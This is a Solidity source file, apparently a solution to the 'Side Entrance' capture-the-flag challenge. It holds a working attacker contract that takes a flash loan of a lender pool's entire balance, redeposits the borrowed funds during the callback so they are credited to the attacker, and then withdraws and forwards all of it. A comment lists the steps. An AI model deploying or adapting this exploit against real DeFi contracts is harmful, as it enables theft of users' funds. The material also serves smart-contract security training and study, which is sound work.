pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackerSideEntrance {
    using Address for address payable;

    function execute() external payable {
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function attack(ISideEntranceLenderPool pool) external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        msg.sender.sendValue(address(this).balance);
    }

    receive() external payable {}
}

/**
1- Launch attack()
1.1- Execute flashLoan() borrowing all the amount in the Pool contract
1.2- From the Pool, the execute() in this contract is launched
1.3- Execute deposits all the borrowed amount in the Pool, but all is in the msg.sender balance
1.4- The Pool is OK will all the returned balance
2- Execute withdraw(), retrieving all funds from the Pool
3- Send the funds to this contract
 */